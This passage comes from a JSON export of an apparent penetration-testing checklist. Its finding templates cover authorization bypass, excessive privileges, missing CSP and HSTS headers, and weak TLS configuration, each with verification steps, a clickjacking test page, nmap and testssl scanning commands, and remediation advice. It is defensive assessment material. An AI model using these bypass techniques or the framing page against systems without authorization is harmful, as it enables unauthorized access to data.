			{
				"uid": "e0d2b7eb-bb26-4467-ad04-f713cace1caf",
				"name": "Broken Authorization",
				"description": null,
				"type": 2,
				"tasks": [
					{
						"uid": "1696b508-d54e-4b91-b3ac-773b75b998ab",
						"name": "Authorization Bypass - Missing Function Level Access Controls*",
						"instructions": "<p>To better document various tasks (similar to a Test Plan), include a comment that reflects test cases, unique injection payloads, business logic bypass attempts, and attack paths.</p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": true,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 17055623,
							"uid": "7cbd650a-b442-e511-80cf-ecf4bbd04073",
							"name": "Authorization Bypass - Missing Function Level Access Controls",
							"description": "<p>The application does not perform adequate function level access control checks, which allows users to gain unauthorized access to pages or functionality within the application.</p>",
							"severityId": 3,
							"businessImpact": "<p>Due to missing function level access controls, users could gain unauthorized access to sensitive data or functionality within the application. The impact of a user bypassing authorization checks depends on the nature of the application as well as the functionality that is accessed.</p>",
							"sourceIdentifier": "M:7cbd650a-b442-e511-80cf-ecf4bbd04073",
							"verificationInstructions": "<p><strong>Verification Instructions</strong></p><p>Identify application functionality that is only accessible with certain user privileges. Try accessing functionality anonymously or using a user account with different privileges.</p><p>Missing function level access controls can be identified via</p><ul><li><p>forced browsing</p></li><li><p>modifying parameters that define functions / methods to be executed on the server</p></li></ul><p>Do not report authorization bypass if only GUI components are accessible but no data or functionality can be accessed with correct privileges.</p><p><strong>Reporting Requirements</strong></p><ol><li><p>Add multiple scenarios for \"unique\" authorization bypass issues</p></li><li><p>Add a description that explains how authorization bypass is exploited</p></li><li><p>Show functionality that is not accessible to certain user</p></li><li><p>Show how the functionality can be accessed</p></li><li><p>Show the impact</p></li></ol><p><strong>Tools</strong></p><ul><li><p>Burp - Compare Site Maps</p></li></ul>",
							"references": "<ul><li>https://owasp.org/Top10/A01_2021-Broken_Access_Control/</li><li>https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html</li></ul>",
							"exploitInstructions": "",
							"remediationInstructions": "<p>Ensure that strong access controls are in place to prevent unauthorized access to application pages and functionality. Authorization checks should be performed server-side prior to providing users access application functionality. Do not rely on authorization checks that are performed client-side, as the client may be able to manipulate and bypass these checks. Ensuring that server-side authorization checks are in place will help prevent users from gaining unauthorized access to restricted functionality within the application.</p>"
						},
						"ordinal": 401,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "ae339ba7-9f15-4b8e-988b-3196007ea387",
						"name": "Authorization Bypass - Insecure Direct Object References",
						"instructions": null,
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 17056152,
							"uid": "fbc2a25a-4c53-e511-80d2-ecf4bbd04073",
							"name": "Authorization Bypass - Insecure Direct Object References",
							"description": "<p>The application does not perform adequate authorization checks. An authenticated user can gain unauthorized access to sensitive information or functionality by manipulating specific parameters within the application.</p>",
							"severityId": 3,
							"businessImpact": "<p>An authenticated user could gain unauthorized access to sensitive data within the application. The impact of a user bypassing authorization checks depends on the nature of the application as well as the data that is accessed.</p>",
							"sourceIdentifier": "M:fbc2a25a-4c53-e511-80d2-ecf4bbd04073",
							"verificationInstructions": "<p><strong>Verification Instructions</strong></p><p>To test for this vulnerability the tester first needs to map out all locations in the application where user input is used to reference objects directly. For example, locations where user input is used to access a database row, a file, application pages and more. Next the tester should modify the value of the parameter used to reference objects and assess whether it is possible to retrieve objects belonging to other users or otherwise bypass authorization.</p><p>The best way to test for direct object references would be by having at least two (often more) users to cover different owned objects and functions. For example two users each having access to different objects (such as purchase information, private messages, etc.), and (if relevant) users with different privileges (for example administrator users) to see whether there are direct references to application functionality. By having multiple users the tester saves valuable testing time in guessing different object names as he can attempt to access objects that belong to the other user.</p><p><strong>Reporting Requirements</strong></p><ol><li><p>Add multiple scenarios for \"unique\" authorization bypass issues</p></li><li><p>Add a description that explains how authorization bypass is exploited</p></li><li><p>Show data that is accessible to a certain user</p></li><li><p>Show how data that is not accessible to the user can be accessed</p></li><li><p>Show the impact</p></li></ol><p><strong>Tools</strong></p><ul><li><p>Burp - Compare Site Maps</p></li></ul>",
							"references": "<ul><li>https://owasp.org/www-community/Access_Control</li><li>https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control.html</li><li>https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html</li><li>https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html</li></ul>",
							"exploitInstructions": "",
							"remediationInstructions": "<p>Ensure that strong access controls are in place to prevent unauthorized access to sensitive information. Authorization checks should be performed prior to providing users access to information within the application. Any part of the application that relies on user input to return data should perform server-side authorization checks. Do not rely on authorization checks that are performed client-side, as the client may be able to manipulate and bypass these checks. Ensuring that server-side authorization checks are in place will help prevent users from gaining unauthorized access to sensitive data within the application.</p>"
						},
						"ordinal": 402,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "5343457d-85ff-4353-b86d-79a5c35c5798",
						"name": "Authorization Bypass - Application Flow*",
						"instructions": "<p>To better document various tasks (similar to a Test Plan), include a comment that reflects test cases, unique injection payloads, business logic bypass attempts, and attack paths.</p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": true,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 3108811,
							"uid": "f63c0567-8b11-e011-a5dd-0024e8fa06c4",
							"name": "Authorization Bypass - Application Flow",
							"description": "<p>An authenticated user can gain unauthorized access to sensitive information or functionality by manipulating the flow of the application.</p>",
							"severityId": 3,
							"businessImpact": "<p>An authenticated user could gain unauthorized access to sensitive data or functionality within the application. The impact of a user bypassing authorization checks depends on the nature of the application as well as the data that is accessed.</p>",
							"sourceIdentifier": "M:3108811",
							"verificationInstructions": "<p><strong>Verification Instructions</strong></p><p>Application flow authorization bypass identification is unique for every application. Typically, it does not require parameter manipulation but rather manipulation of the sequence of events in the application.</p><p>Classic example:</p><p>Online store collect order info, address info, payment info, and order confirmation on separate pages. Application flow can be manipulated by entering order info and address info, then bypassing payment info page by confirming the order by browsing to the confirmation page.</p><p><strong>Reporting Requirements</strong></p><ol><li><p>Add multiple scenarios for \"unique\" authorization bypass issues</p></li><li><p>Add a description that explains how authorization bypass is exploited</p></li><li><p>Show data or functionality that is accessible to a certain user</p></li><li><p>Show how data or functionality that is not accessible to the user can be accessed</p></li><li><p>Show the impact</p></li></ol>",
							"references": "<ul><li><p>https://owasp.org/www-community/Access_Control</p></li><li><p>https://owasp.org/www-community/vulnerabilities/Business_logic_vulnerability</p></li></ul>",
							"exploitInstructions": "",
							"remediationInstructions": "<p>Ensure that strong access controls are in place to prevent unauthorized access to sensitive information and functionality.  Authorization checks should be performed prior to providing users access to web pages, information, and functionality within the application.  Any part of the application that relies on user input to return data should perform server-side authorization checks. Do not rely on authorization checks that are performed client-side, as the client may be able to manipulate and bypass these checks.  Ensuring that server-side authorization checks are in place will help prevent users from gaining unauthorized access to sensitive data and functionality within the application.</p>"
						},
						"ordinal": 403,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "e2573bd4-8071-4f4d-b8a3-45f6d2250687",
						"name": "Authorization Bypass - Client-Side Controls",
						"instructions": null,
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 5049707,
							"uid": "9b981bbf-3895-e111-8397-001e4f120021",
							"name": "Authorization Bypass - Client-Side Controls",
							"description": "<p>The application does not perform adequate server-side authorization checks. An authenticated user can gain unauthorized access to sensitive information or functionality by bypassing client-side controls within the application.</p>",
							"severityId": 2,
							"businessImpact": "<p>An authenticated user could gain unauthorized access to sensitive data or functionality within the application.  The impact of a user bypassing authorization checks depends on the nature of the application as well as the data that is accessed.</p>",
							"sourceIdentifier": "M:9b981bbf-3895-e111-8397-001e4f120021",
							"verificationInstructions": "<p><strong>Verification Instructions</strong></p><p>The underlying issue for Authorization Bypass - Client-Side Controls is most likely Insecure Direct Object Reference or Missing Function Level Access Controls. In most cases, those findings should be used instead of this.</p><p>If the client application relies on server responses to determine user access in the application, then the vulnerability can be reported as client-side control to make it clearer where the weakness in the application is. This is quite typical for Flash, Silverlight, etc. applications: after user signs in, the server responds with user access data that is used to construct the user interface and limit access to certain functions / data.</p><p>Try manipulating server responses to enable functionality that should not be accessible to the user. This may require changing user roles, user ids, boolean values (false to true), etc.</p><p><strong>Reporting Requirements</strong></p><ol><li><p>Add an explanation how client-side controls are used to control user access in the application</p></li><li><p>Show how application data can be manipulated to escalate access</p></li><li><p>Show access to unauthorized functionality or data</p></li></ol>",
							"references": "<ul><li>https://www.owasp.org/index.php/Transaction_Authorization_Cheat_Sheet</li><li>https://www.owasp.org/index.php/Category:Access_Control</li></ul>",
							"exploitInstructions": "",
							"remediationInstructions": "<p>Ensure that strong access controls are in place to prevent unauthorized access to sensitive information and functionality.  Authorization checks should be performed prior to providing users access to web pages, information, and functionality within the application.  Any part of the application that relies on user input to return data should perform server-side authorization checks. Do not rely on authorization checks that are performed client-side, as the client may be able to manipulate and bypass these checks.  Ensuring that server-side authorization checks are in place will help prevent users from gaining unauthorized access to sensitive data and functionality within the application.</p><p>Use client-side controls only as redundant authorization checks.</p>"
						},
						"ordinal": 404,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "d42a8048-65c7-4175-8551-332a010d5aad",
						"name": "Excessive Privileges - Web Application User",
						"instructions": null,
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 17055074,
							"uid": "091999e3-05d1-e411-a2a9-001e4f12001c",
							"name": "Excessive Privileges - Web Application User",
							"description": "<p>Authenticated application users have excessive permissions to access resources, data and/or functionality.</p>",
							"severityId": 2,
							"businessImpact": "<p>Authenticated application users may be able to access sensitive information; this can lead to the compromise of the confidentiality of the information stored on the affected server. Additionally, a malicious user can use the disclosed information in further attacks against the target system.</p>",
							"sourceIdentifier": "M:091999e3-05d1-e411-a2a9-001e4f12001c",
							"verificationInstructions": "<p><strong>Verification Instructions</strong></p><p>Determining excessive privileges for a web application user is quite subjective. Typically, excessive privileges should be reported if, for example, lower privileged user can use application functionality to alter their own privileges without exploiting authorization bypass issue. I.e., read-only user has access to manage own user role in the application.</p><p><strong>Reporting Requirements</strong></p><ol><li><p>Add an explanation why it was determined that application users have excessive privileges</p></li><li><p>Show application functionality that should not be accessible to certain user roles</p></li><li><p>Show the impact of the issue (such as adding administrator role own account)</p></li></ol>",
							"references": "<ul><li>https://www.owasp.org/index.php/Security_by_Design_Principles</li><li>https://www.owasp.org/index.php/Access_Control_Cheat_Sheet</li></ul>",
							"exploitInstructions": "",
							"remediationInstructions": "<p>Follow the principle of least privilege when assigning permissions to application users. Do not grant application users privileges to any resources that do not need to be accessed for proper functioning of the application.</p>"
						},
						"ordinal": 405,
						"commentsCount": 0,
						"hasLinkedFinding": false
					}
				],
				"ordinal": 6,
				"collapsed": true
			},
			{
				"uid": "c738d8f9-09a0-4702-ad7c-e7a33a3ebd9e",
				"name": "Security Misconfigurations - Server and Application",
				"description": null,
				"type": 2,
				"tasks": [
					{
						"uid": "fd59cdb7-4185-4c82-8646-1d97693dceb6",
						"name": "Missing HTTP Header - Content-Security-Policy",
						"instructions": null,
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 17058084,
							"uid": "73afffdb-66b9-e511-80d7-ecf4bbd04083",
							"name": "Missing HTTP Header - Content-Security-Policy",
							"description": "<p>The application does not explicitly set the Content-Security-Policy HTTP header. This header helps to prevent unwanted content from being injected into the application, aiding in the mitigation and prevention of XSS vulnerabilities, unintended tracking, unacceptable frames, and other potentially malicious content.</p>",
							"severityId": 1,
							"businessImpact": "<p>Content-Security-Policy header provides an additional layer of security for the site from client-side attacks such as cross-site scripting. In the absence of this header, an attacker can exploit client-side vulnerabilities such as cross-site scripting, clickjacking, and packet sniffing attacks.</p>",
							"sourceIdentifier": "CX:4033",
							"verificationInstructions": "<h3>Verification Instructions:</h3><p>Use Burp to see if the CSP header is missing on responses. If it is missing, then include this finding.</p><p>For APIPENs, this finding is only applicable if the application renders HTML in the HTTP response. An attack such as cross-site scripting or data injection would require the weaponization of a user's web browser to be successful. If the API response returns data in any other form, such as JSON, do not report this finding.</p><h3>Reporting Instructions:</h3><p>If the issue is systemic:</p><ol><li><p>Include a message in the Instance Details that the issue is systemic throughout the application.</p></li><li><p>Update the Affected URL to include a /&#42; to denote all pages.</p></li><li><p>Show an HTTP request/response from Burp - Do <strong>NOT</strong> highlight the entire header section of the response to show it it missing.</p></li><li><p>If framing is possible because of a misconfigured CSP, include a PoC in the verification steps using the sample HTML below.</p></li><ol><li><p>You do not need to separately call out the Clickjacking finding as fixing the CSP with frame-ancestors is best option.</p></li></ol></ol><p>If the issue is not systemic:</p><ol><li><p>Ensure the Affected URL in the Instance Details is correct for all pages missing CSP</p></li><li><p>Show an HTTP request/response from Burp - Do <strong>NOT</strong> highlight the entire header section of the response to show it it missing.</p></li><li><p>If framing is possible because of a misconfigured CSP, include a PoC in the verification steps using the sample HTML below.</p></li></ol><h3><strong>Clickjacking POC:</strong></h3><p>Use the below Clickjacking POC to attempt framing application pages.</p><pre><code>&lt;html&gt;\n\t&lt;script&gt;\n\t\tvar setFrameSrc = function() {\n\t\t\tvar url = document.getElementById('url').value;\n\t\t\tdocument.getElementById('frame').src = url;\n\t\t};\n\t&lt;/script&gt;\n\t&lt;body&gt;\n\t\t&lt;div&gt;\n\t\t\t&lt;p&gt;Enter the URL to frame:&lt;/p&gt;\n\t\t\t&lt;input id='url' type='text' size=50&gt;\n\t\t\t&lt;button onclick=&quot;setFrameSrc()&quot;&gt;Set URL&lt;/button&gt;\n\t\t&lt;/div&gt;\n\t\t&lt;div&gt;\n\t\t\t&lt;iframe id='frame' width=500px height=500px&gt;&lt;/iframe&gt;\n\t\t&lt;/div&gt;\n\t&lt;/body&gt;\n&lt;/html&gt;</code></pre><h3>Useful Bambda</h3><p>The following Bambda may be useful in identifying misconfigured or missing CSP headers.</p><p><a href='https://github.com/NetSPI/bambdas/blob/main/Filter/Proxy/HTTP/CSP%20Misconfigured.bambda'>https://github.com/NetSPI/bambdas/blob/main/Filter/Proxy/HTTP/CSP%20Misconfigured.bambda</a></p><p><strong>Note: This is a Proxy Filter Bambda. </strong>Refer to this page to see how to use them easily: <a href='https://outline.netspi.com/doc/bambda-scripts-MG0zPMKK15#h-how-to-use-bambdas'>https://outline.netspi.com/doc/bambda-scripts-MG0zPMKK15&#35;h-how-to-use-bambdas</a></p><p>This Bambda identifies if the CSP is missing entirely or has bad directives like &quot;unsafe-inline&quot;, &quot;unsafe-eval&quot;. It will add notes to the request to tell you why it is considered &quot;bad&quot;.</p><img src=\"\" data-image-id=\"359741\">",
							"references": "<ul><li>https://github.com/OWASP/www-project-secure-headers</li><li>https://www.w3.org/TR/CSP2/</li><li>https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html</li></ul>",
							"exploitInstructions": null,
							"remediationInstructions": "<p>It is a best practice to implement the Content-Security-Policy header throughout the application. The specific implementation of the CSP header depends on the application configuration but general instructions for CSP headers can be found at: https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html.</p><p>At a minimum, Content-Security-Policy should be used to restrict script execution with the script-src directive and prevent framing attacks with the frame-ancestors directive.</p>"
						},
						"ordinal": -1,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "09a886d4-992a-4c76-b9aa-dcf283f8b0ea",
						"name": "Missing HTTP Header - Strict-Transport-Security",
						"instructions": null,
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 17053737,
							"uid": "390f2bc9-3701-e411-9781-001e4f12001c",
							"name": "Missing HTTP Header - Strict-Transport-Security",
							"description": "<p>An HTTP Strict-Transport-Security (HSTS) header directs client browsers to only accept communication with the web server over an encrypted SSL/TLS connection for a set period. Additionally, any further requests over unencrypted HTTP by the browser will automatically be converted to encrypted HTTPS.</p><p>Consider following attack scenarios:</p><ul><li><p>Users often omit the URI scheme i.e., https:// when typing a URL in location bar to access a website. Also, third party websites can link to the site using the http scheme instead of https. This could result in an initial connection to an HTTPS-enabled site over an unencrypted channel. An eavesdropping attacker can hijack this unencrypted connection and replace the intended use of HTTPS protocol with HTTP in an attack known as SSLStrip, granting unauthorized access to all subsequent traffic.</p></li><li><p>Websites often transfer non-sensitive resources such as help documents over an unencrypted HTTP connection. Any cookies without a secure flag are sent along with such requests potentially disclosing sensitive user and session data to eavesdroppers.</p></li><li><p>Man-in-the-Middle attacks that exploit user tendencies to override invalid certification warnings, e.g., SSLSniff.</p></li></ul><p>For web sites configured with an accurate HSTS policy, browsers automatically upgrade any HTTP connections to HTTPS. Furthermore, browsers prevent users from overriding any host certificate warnings. HSTS offers an effective defense against above attack scenarios.</p>",
							"severityId": 1,
							"businessImpact": "<p>A successful MiTM attack such as SSLStrip or SSLsniff can lead to the compromise of sensitive user data such as financial information, Social Security Number, personal information etc. as well as grant unauthorized access to user accounts enabling attackers to perform privileged actions on client's behalf.</p>",
							"sourceIdentifier": "WI:11365",
							"verificationInstructions": "<h3><strong>Verification Instructions:</strong></h3><p>Inspect HTTP responses to determine whether the Strict-Transport-Security header is missing.</p><p>HSTS header cannot be set on applications that work over HTTP. If <code>Cleartext Protocol - HTTP</code> is reported, <code>Missing HTTP Header - Strict-Transport-Security</code> can be reported but the verification should include a note stating that when <code>Cleartext Protocol - HTTP</code> is fixed, HSTS should be set as well.</p><p>On pure API tests without a browser-based user interface, HSTS is not required as it does not affect API calls.</p><h3><strong>Reporting Requirements:</strong></h3><ol><li><p>Add an explanation whether the header is missing throughout the application (Affected URL is <code>/&#42;</code>) or only on certain pages (include Affected URLs list).</p></li><li><p>Show sample HTTP response header without Strict-Transport-Security.</p></li></ol>",
							"references": "<ul><li>http://tools.ietf.org/html/rfc6797</li><li>https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security</li><li>https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Strict_Transport_Security_Cheat_Sheet.html</li></ul>",
							"exploitInstructions": "",
							"remediationInstructions": "<p>Configure the web application to include Strict-Transport-Security header in every response generated by an HTTPS-enabled site. Any HTTP version of site on the same domain should permanently redirect to the secure encrypted site. For HTTP sites on the same domain, the header should not be added to the HTTP response, but to do a permanent redirect (301 status code) to the HTTPS site.</p><p>Example of the HTTP strict transport security header:</p><pre><code>Strict-Transport-Security: max-age=31536000</code></pre><p>If all subdomains are HTTPS, then the following header is applicable: </p><pre><code>Strict-Transport-Security: max-age=31536000; includeSubDomains</code></pre><p>It is important to note that this header does not prevent attack scenarios during the very first connection to the site or any connections established after the set period has expired. To prevent such a scenario, the site must be added to the pre-loaded HSTS hosts list embedded in both Google Chrome and Mozilla Firefox browsers.</p>"
						},
						"ordinal": 703,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "dc0f8ea4-8dd0-4985-a304-3aa691f8c624",
						"name": "SSL/TLS - Weak Encryption Ciphers",
						"instructions": null,
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 751,
							"uid": "6335944e-03b1-dd11-992f-001e4f120030",
							"name": "Weak Configuration - SSL/TLS - Weak Encryption Ciphers",
							"description": "<p>The SSL/TLS protocol supports several cipher suites, each providing a different level of security. The SSL/TLS protocol permits the server to support some or all these cipher suites and during the initial SSL/TLS session setup stage, it allows the client to pick the cipher suite to be used for that session. The hosts use certificates and public and private session keys to securely negotiate the cipher suite to be used.</p><p>Encryption ciphers that use keys shorter than 128 bits are considered cryptographically insecure. It may be possible to decrypt messages that have been encrypted with a weak cipher. Additionally, some encryption ciphers are considered insecure due to known weaknesses in their implementation, such as 3DES due to Sweet32, RC4 due to Bar Mitzvah, and CBC ciphers due to padding oracle attacks.</p><p>Weak SSL/TLS ciphers are not necessarily used by default when they are enabled. However, an attacker may be able to force an SSL/TLS connection to use weak ciphers. It should be noted that disabling weak ciphers prevents legacy browsers from successfully establishing an SSL/TLS connection.</p><p>Attacks against weak encryption ciphers often require considerable computing resources to be successful. While difficult, this attack is feasible for nation state threat actors.</p>",
							"severityId": 1,
							"businessImpact": "<p>If an attacker decrypted communications sent over a connection secured with a deprecated or weak cipher, the confidentiality of information sent over this connection would be compromised.</p>",
							"sourceIdentifier": "GID:4558",
							"verificationInstructions": "<h3>Verification Requirements:</h3><p>Run the following tool against the in-scope endpoint(s).</p><p>To do: Add sample verification for Pypher</p><h3>Sample Verification - Nmap</h3><p>MF QA Needed</p><blockquote><p><span style=\"color: rgb(219, 39, 25)\"><strong>10.10.10.10</strong></span>: Using Nmap's ssl-enum-ciphers script, NetSPI observed a service that supported weak TLS encryption ciphers.</p></blockquote><pre><code><strong>nmap -Pn -p 443 --script=+ssl-enum-ciphers 10.10.10.10\n[TRUNCATED]</strong>\n\nPORT    STATE SERVICE\n443/tcp open  https\n| ssl-enum-ciphers:\n|   TLSv1.2:\n|     ciphers:\n<span style=\"color: rgb(219, 39, 25)\"><strong>|       TLS_RSA_WITH_AES_256_CBC_SHA (rsa 4096) - A\n|       TLS_RSA_WITH_AES_128_CBC_SHA (rsa 4096) - A\n|       TLS_RSA_WITH_AES_256_CBC_SHA256 (rsa 4096) - A\n|       TLS_RSA_WITH_AES_128_CBC_SHA256 (rsa 4096) - A</strong></span>\n|       TLS_RSA_WITH_AES_256_GCM_SHA384 (rsa 4096) - A\n|       TLS_RSA_WITH_AES_128_GCM_SHA256 (rsa 4096) - A\n<span style=\"color: rgb(219, 39, 25)\"><strong>|       TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA (secp256r1) - A\n|       TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA (secp256r1) - A\n|       TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA384 (secp256r1) - A\n|       TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256 (secp256r1) - A</strong></span>\n|       TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (secp256r1) - A\n|       TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256 (secp256r1) - A\n<span style=\"color: rgb(219, 39, 25)\"><strong>|       TLS_DHE_RSA_WITH_AES_256_CBC_SHA256 (dh 2048) - A\n|       TLS_DHE_RSA_WITH_AES_128_CBC_SHA256 (dh 2048) - A</strong></span>\n|       TLS_DHE_RSA_WITH_AES_256_GCM_SHA384 (dh 2048) - A\n|       TLS_DHE_RSA_WITH_AES_128_GCM_SHA256 (dh 2048) - A\n<span style=\"color: rgb(219, 39, 25)\"><strong>|       TLS_DHE_RSA_WITH_AES_256_CBC_SHA (dh 2048) - A\n|       TLS_DHE_RSA_WITH_AES_128_CBC_SHA (dh 2048) - A\n</strong></span><strong>[TRUNCATED]</strong></code></pre><p><strong>(Recommended) Option: Pypher</strong></p><p><a target=\"_blank\" rel=\"noopener noreferrer nofollow\" href=\"https://github.com/NetSPI/pypher\">https://github.com/NetSPI/pypher</a></p><p>Pypher automatically uses [nmap or testssl] and reports the findings with the tool that was used during the scan.</p><p>See the README for extra useage info.</p><pre><code># single host\npy pypher.py --host hostname [-p port]\n\n# multiple hosts\npy pypher.py --host hosts.txt [-p port]<strong> </strong></code></pre><p><strong>Option 2: Nmap</strong></p><pre><code>nmap --script ssl-enum-ciphers -p 443 x.x.x.x</code></pre><p><strong>Option 3: testssl.sh</strong></p><p><a target=\"_blank\" rel=\"noopener noreferrer nofollow\" href=\"https://github.com/drwetter/testssl.sh\">https://github.com/drwetter/testssl.sh</a></p><pre><code>./testssl.sh [host|host:port|URL|URL:port]\n# or for a specific protocol\n./testssl.sh --starttls ftp &lt;IP&gt;:&lt;PORT&gt;</code></pre><h3></h3><h3>Reporting requirements:</h3><p>Report and highlight any of the following ciphers:</p><ul><li><p>Keys shorter than 128 bits</p></li><li><p>3DES (or any other DES cipher)</p></li><li><p>RC4 (or any other RC cipher)</p></li><li><p>CBC ciphers</p></li><li><p>SHA/SHA-1</p></li><li><p>TLS ciphers that do not use GCM, CCM, or ChaCha20-Poly1305. This is because if they do not include these, they are inherently using CBC.</p></li><li><p>DHE key exchange. See below for more info on this.</p></li></ul><p><strong>Ciphers that use DHE (Diffie-helman key exchange) are considered weak.</strong></p><p>https://dheatattack.com/</p><p>https://raccoon-attack.com/</p><p><strong>Perfect Forward Secrecy</strong></p><p>Any cipher that does not include ECDHE or DHE is not protected with Perfect Forward Secrecy (PFS). </p><p>- If the application does not offer ANY ciphers with PFS, then add this finding and explain in the Instance Details.</p><p>- If any ciphers are offered that do have PFS, then this part doesn't apply.</p><h3>Severity:</h3><p>Note that the severity of this is now <span style=\"color: rgb(219, 39, 25)\"><strong>LOW</strong></span> (10/18/23). There is not longer a caveat related to CBC failures. However, if a client is doing a PCI engagement, this may need to be upgraded to MEDIUM to follow PCI compliance.</p>",
							"references": "<ul><li>https://ssl-config.mozilla.org/</li><li>https://wiki.mozilla.org/Security/Server_Side_TLS&#35;Modern_compatibility</li><li>https://ciphersuite.info/cs/?security=recommended&amp;page=2&amp;software=openssl&amp;tls=tls12</li><li>https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/01-Testing_for_Weak_Transport_Layer_Security</li></ul>",
							"exploitInstructions": "",
							"remediationInstructions": "<p>Do not use any ciphers that have a key length less than 128 bits.</p><p>Do not use any ciphers that have known security weaknesses including: DHE, 3DES, RC4, SHA/SHA-1, and CBC ciphers.</p><p>Only use TLS ciphers that use GCM, CCM, or ChaCha20-Poly1305 encryption. Ciphers that do not include these are, by default, using CBC, RC4 or other weaker encryption mechanisms.</p><p>A secure configuration generator is available at the first reference link below.</p>"
						},
						"ordinal": 704,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "3ba991c0-9ba7-4444-b0ec-7b9adbfc5367",
						"name": "SSL/TLS - Deprecated Protocol Usage",
						"instructions": null,
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 715,
							"uid": "f634944e-03b1-dd11-992f-001e4f120030",
							"name": "Weak Configuration - SSL/TLS - Deprecated Protocol",
							"description": "<p>SSL versions 2.0, 3.0 and TLS versions 1.0 and 1.1 contain several cryptographic flaws and have been deprecated.</p><p>The following weaknesses have been identified in SSL 2.0:</p><ul><li><p>Weak MAC construction</p></li><li><p>Unnecessarily weakened &quot;export&quot; mode uses 40-bit authentication keys</p></li><li><p>The integrity of the SSL handshake is unprotected, making it possible to perform a man-in-the-middle attack to alter ciphers negotiated during the handshake</p></li><li><p>Reliance on TCP connection close; if a TCP FIN packet is forged and sent to the recipient, the recipient will be unaware that the connection ended illegitimately</p></li><li><p>Padding size is included in cleartext when using block ciphers</p></li><li><p>Compression is not used before encryption, which makes crypto analysis easier</p></li><li><p>Cross-protocol padding oracle attack (DROWN)</p></li></ul><p>The following weaknesses have been identified in SSL 3.0:</p><ul><li><p>Non-deterministic padding used in the CBC construction (POODLE)</p></li><li><p>Weak renegotiation of sessions, allowing man-in-the-middle attacks</p></li><li><p>Weak key derivation process</p></li><li><p>Relies on possible weak cryptographic primitives</p></li><li><p>Does not support ECDH and ECDSA algorithms</p></li><li><p>Man-in-the-middle initialization vector attacks against CBC-mode ciphers (BEAST)</p></li></ul><p>The following weaknesses have been identified in TLS 1.0:</p><ul><li><p>Non-deterministic padding used in the CBC construction (POODLE)</p></li><li><p>Man-in-the-middle initialization vector attacks against CBC-mode ciphers (BEAST)</p></li></ul><p>The following weaknesses have been identified in TLS 1.1:</p><ul><li><p>TLS 1.1 lacks support for current and recommended ciphers suites, and many vendors are removing support for TLSv1.1</p></li></ul>",
							"severityId": 1,
							"businessImpact": "<p>If an attacker decrypted communications sent over a connection secured with a deprecated protocol, the confidentiality of information sent over this connection would be compromised.</p>",
							"sourceIdentifier": "GID:4557",
							"verificationInstructions": "<h3>Verification Requirements:</h3><p>Run the following tool against the in-scope endpoint(s).</p><h3>Sample Verification - Nmap - QA Needed</h3><blockquote><p><strong><span style=\"color: #DB2719\">10.10.10.10</span></strong>: Using Nmap's ssl-enum-ciphers script, NetSPI observed a service that accepted the deprecated TLSv1.0 and TLSv1.1 protocols.</p></blockquote><pre><code><strong>nmap -Pn -p 443 --script ssl-enum-ciphers 10.10.10.10\n</strong><strong>[TRUNCATED]</strong>\n\nPORT     STATE SERVICE\n3389/tcp open  ms-wbt-server\n| ssl-enum-ciphers:\n<strong><span style=\"color: #DB2719\">|   TLSv1.0:\n</span></strong><strong><span style=\"color: #DB2719\">|     ciphers:\n</span></strong><strong><span style=\"color: #DB2719\">|       TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA (secp256r1) - A\n</span></strong><strong><span style=\"color: #DB2719\">|       TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA (secp256r1) - A\n</span></strong><strong><span style=\"color: #DB2719\">|       TLS_DHE_RSA_WITH_AES_256_CBC_SHA (dh 1024) - A\n</span></strong><strong>[TRUNCATED]\n</strong><strong><span style=\"color: #DB2719\">|   TLSv1.1:\n</span></strong><strong><span style=\"color: #DB2719\">|     ciphers:\n</span></strong><strong><span style=\"color: #DB2719\">|       